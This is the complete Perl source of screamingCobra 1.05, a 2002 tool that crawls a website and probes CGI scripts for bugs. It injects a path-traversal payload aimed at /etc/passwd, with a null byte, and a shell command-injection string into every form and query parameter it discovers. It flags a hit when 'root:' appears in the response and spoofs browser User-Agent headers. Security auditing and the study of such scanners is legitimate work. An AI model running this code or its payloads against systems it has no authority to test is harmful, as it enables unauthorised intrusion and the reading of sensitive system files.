#!/usr/bin/perl

################################################################################
#
# screamingCobra 1.05 (crawl5b) - by Samy Kamkar
#          commport5@LucidX.com
#
# 1.05 released < NULL, 2002 >
#
#
# Originally developed for Caezar's Challenge V
# core was finished that night...well, morning :)
# (at DefCon 9)
#
# Home page: http://cobra.LucidX.com/
#
# Algorithm for this hefty piece of artillery can
# be found at http://cp5.LucidX.com/5balgo1.html
#
# Caezar's challenge: http://caezarschallenge.org
#
# Read the README for help and the changeLog
# for changes
#
# Read the LICENSE for the license, also found below
#
# CONFIGURATION - read README for more info

$technique1 = "../" x 20 . "etc/passwd\0"; # ../../../../etc/passwd, basically :)
$technique2 = 'foo;foo|perl -e \'print"roo";print"t:"\'&&foo' . "\0"; # a few escaping attempts

my @first = (  # tags right after a '<'
 "img", "a", "body", "area", "frame", "meta",
);

my @second = ( # arguements in any of the tags in @first
 "src", "href", "background", "target",
);

my @ignore = ( # extensions of files to not access
 "gif", "jpg", "jpeg", "bmp", "psp", "mov", "txt", "ram", "wmv", "pdf", "bz2",
 "doc", "xls", "rm", "gz", "tar", "zip", "png", "mpg", "mpeg", "mp3", "tgz",
);

my @requests = ( # used randomly when requesting pages
 "Accept: */*\n" .
 "Accept-Language: en-us\n" .
 "Accept-Encoding: deflate\n" .
 "User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)\n\n",

 "Accept: */*\n" .
 "User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)\n\n",

);

# END OF CONFIGURATION
# you shouldn't need to chage anything below this!
#
# LICENSE (also found the in the ./LICENSE file)
#
#
#
# Copyright (c) 2002 Samy Kamkar <CommPort5@LucidX.com>.
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. The name of the author may not be used to endorse or promote products
#    derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
# OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
# THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
################################################################################



use IO::Socket;

$SIG{INT} = sub { die "\n" };

my $usage;
my $version = "1.05";
my ($statusbar, $techniques, $verbose, $host, $ip, $page, $port, $all) = &begin();
my ($pagesAccessed, $bugsFound, $cgisAccessed) = (0, 0, 0);
my (%urlsAccessed, %urlsToAccess, %bug);

my $ignore = join('|', @ignore);
my $first  = join('|', @first);
my $second = join('|', @second);

for (1 .. $techniques) {
 ${"technique$_"} =~ s/\W/"%" . unpack("H2", $&)/eg;
}

print "Beginning to scan " . colored($host, "bold") . " :: " . colored($ip, "bold") . " for CGI bugs...\n";
print "Kick back and relax, this will take a while...\n\n";

&status() if $statusbar;

if ($page) {
 $urlsToAccess{$page} = 1;
}
else {
 $urlsToAccess{"/"} = 1;
}

&recursive(\%urlsToAccess, \%urlsAccessed);

sub recursive {
 my ($urlsToAccess, $urlsAccessed) = @_;
 foreach my $url (keys(%{$urlsToAccess})) {
  my $currentDir;
  if ($url =~ /\/$/) {
   $currentDir = $url;
  }
  else {
   $url =~ /^(.*\/)[^\/]+$/;
   $currentDir = $1;
  }
  $urlsAccessed->{$url} = 1;
  delete($urlsToAccess->{$url});
  my $sock = IO::Socket::INET->new(
        PeerAddr => $ip,
        PeerPort => $port,
        Timeout  => 3,
        Proto    => "tcp"
  ) or &error("Can't connect to $ip:$port: $!\n");
  $url =~ s/&$//;
  $pagesAccessed++;

  print "\rGETing $url\n" if $verbose;
  &status() if $statusbar;
  print $sock "GET $url HTTP/1.0\nHost: $host\n" . $requests[int(rand(@requests))];
  my $httpResponse = join('', <$sock>);
  $httpResponse =~ s/\n/ /g;
  $httpResponse = ">$httpResponse<";
  my @form = ();
  foreach my $response (split(/>[^<]*</, $httpResponse)) {
   my ($tmp, $addr);

   # check for form beginnings
   if ($response =~ /^form.*action\s*=\s*"?'?([^"'\s]+)/i) {
    $form[0] = $1 . "?";
    $form[0] =~ s/^http:\/\/[^\/]+//i;
    if ($form[0] !~ /^\//) {
     $form[0] = $currentDir . $form[0];
    }
   }

   # check for a select
   elsif ($form[0] && $response =~ /select\s+name\s*=\s*"?'?([^"'\s]+)/i) {
    $form[0] .= "$1=";
    $form[2]++;
   }

   # check for normal form inputs
   elsif (
    $form[0] &&
    $response =~
    /(?:type\s*=\s*"?'?([^"'\s]*)"?'?)?.*\s+name\s*=\s*"?'?([^"'\s]+)'?"?\s*(?:value\s*=\s*"?'?([^"'\s]*))?/i
   ) {
    my ($type, $name, $value) = ($1, $2, $3);
    $form[0] .= $name . "=" . $value . "&";
   }

   # check for option values for forms
   elsif ($form[0] && $form[2] && $response =~ /option\s+value\s*=\s*"?'?([^"'\s]+)/i) {
    $form[0] .= $1 . "&";
    $form[2] = 0;
   }

   # check for end of forms
   elsif ($form[0] && $response =~ /\/form/i) {
    $form[1]++;
   }

   # check for unwanted tags
   unless ($response =~ /^(?:$first).*(?:$second)\s*=\s*"?'?([^"'\s]+)/i) {
    unless ($form[1]) {
     next;
    }
    else {
     $tmp = $form[0];
     $tmp =~ s/&$//;
     @form = ();
    }
   }

   unless ($tmp) {
    $tmp = $1;
   }
   if ($tmp =~ s/^http:\/\/([^\/:]+)(?::\d+)?//i) {
    $addr = $1;
   }
   else {
    $addr = "";
   }
   if ($tmp !~ /^\//) {
    $tmp = $currentDir . $tmp;
   }
   if (
    (
     $addr && !$tmp
    ) ||
    $urlsToAccess->{$tmp} ||
    $urlsAccessed->{$tmp} ||
    $tmp =~ /mailto:|irc:|javascript:|#|https:|ftp:|news:/i ||
    (
     $tmp !~ /\?/ &&
     $all == 0 &&
     $tmp =~ /\.(?:$ignore)$/i
    ) ||
    (
     $all == 0 &&
     $tmp =~ /\?[A-Z]=[A-Z]$/
    )
   ) {
    next;
   }
   $urlsToAccess->{$tmp} = 1;
   if ($tmp =~ /\?/) {
#    $urlsAccessed->{$tmp} = 1;
    &check($tmp);
   }
  }
 }
 if (keys(%{$urlsToAccess}) > 0) {
  &recursive($urlsToAccess, $urlsAccessed);
 }   
}

sub check {
 my $cgi = $_[0];
 $cgi =~ s/&$//;
 $cgisAccessed++;
 print "\rAttempting to break $cgi\n" if $verbose;
 &status() if $statusbar;

 $cgi =~ s/([\+\%\$\@\*\\\|\^\(\[\{\)\]\}])/\\$1/g;
 my $origcgi = $cgi;
 $cgi =~ s/^(.*\?)//;
 my $cgib = $1;

 if ($cgi !~ /=/) {
  for (1 .. $techniques) {
   $origcgi =~ s/\?.*$/?/;
   $origcgi .= ${"technique$_"};
   my $sock = IO::Socket::INET->new(
	PeerAddr => $ip,
	PeerPort => $port,
	Timeout  => 3,
	Proto    => "tcp"
   ) or &error("Can't connect to $ip:$port: $!\n");
   print $sock "GET $origcgi HTTP/1.0\nHost: $host\n" . $requests[int(rand(@requests))];
   my $response = join('', <$sock>);
   $response =~ s/\n//g;
   if ($response =~ /root(?:\:|"|')/ && !$bug{$origcgi}) {
    $bug{$origcgi} = 1;
    $bugsFound++;
    print "\rBUG FOUND - http://$host:$port$origcgi\n";
   }
  }
 }

 else {
  for (1 .. $techniques) {
   my %info = split(/=|&/, $cgi);
   foreach my $key (keys(%info)) {
    $origcgi = $cgib . $cgi;
    my $tmp = ${"technique$_"};
    $origcgi =~ s/((?:\?|&)$key=)$info{$key}/$1$tmp/;
    my $sock = IO::Socket::INET->new(
	PeerAddr => $ip,
	PeerPort => $port,
	Timeout  => 3,
	Proto    => "tcp"
    ) or &error("Can't connect to $ip:$port: $!\n");
    print $sock "GET $origcgi HTTP/1.0\nHost: $host\n" . $requests[int(rand(@requests))];
    my $response = join('', <$sock>);
    $response =~ s/\n//g;
    if ($response =~ /root(?:\:|"|')/ && !$bug{$origcgi}) {
     $bug{$origcgi} = 1;
     $bugsFound++;
     print "\rBUG FOUND - http://$host:$port$origcgi\n";
    }
   }
  }
 }
}

sub status {
 print STDERR "\r" . " " x (6 - length($pagesAccessed));
 print STDERR colored($pagesAccessed, "bold");
 print STDERR " - pages accessed / " . " " x (5 - length($cgisAccessed));
 print STDERR colored($cgisAccessed, "bold");
 print STDERR " - attempted CGIs to break / " . " " x (5 - length($bugsFound));
 print STDERR colored($bugsFound, "bold");
 print STDERR " - CGI bugs found";
}

sub begin {
 &usage() if @ARGV == 0;

 my $all = 0;
 my $statusbar = 0;
 my $techniques = 1;
 my $url = pop(@ARGV);
 my ($host, $port, $page) = $url =~ /^(?:http:\/\/)?([^\/:]+)(?::(\d+))?(\/.*)?$/i;
 my $ip = join(".", unpack("C4", (gethostbyname($host))[4]));

 if ($port eq "") {
  $port = 80;
 }
 elsif ($port !~ /^\d+$/) {
  &usage();
 }
 foreach (@ARGV) {
  if (/^-(.*)$/) {
   foreach (split(//, $1)) {
    if ($_ eq "v") {
     $verbose = 1;
    }
    elsif ($_ eq "e") {
     $techniques++;
    }
    elsif ($_ eq "s") {
     $statusbar = 1;
     eval("use Term::ANSIColor");
    }
    elsif ($_ eq "i") {
     $all = 1;
    }
    else {
     &usage();
    }
   }
  }
  else {
   &usage();
  }
 }
 if ($verbose && $statusbar) { &usage() }
 
 return ($statusbar, $techniques, $verbose, $host, $ip, $page, $port, $all);
}

sub colored { return $_[0] } # if we don't use Term::ANSIColor

sub usage {
 $usage = 1;
 print STDERR "screamingCobra v.$version -- http://cobra.LucidX.com\n\n";
 print STDERR "usage:   screamingCobra.pl [-e] [-i] [-s|-v] <http://host.name>[:port][/start/page]\n";
 print STDERR " -- view README for examples and information on options --\n";
 die " by Samy Kamkar [commport5\@LucidX.com]\n";
}

sub error {
 $usage = 1;
 die $_[0];
}

END {
 print "\r\n";
 &status() unless $statusbar || $usage;
 print "\n" unless $usage;
}
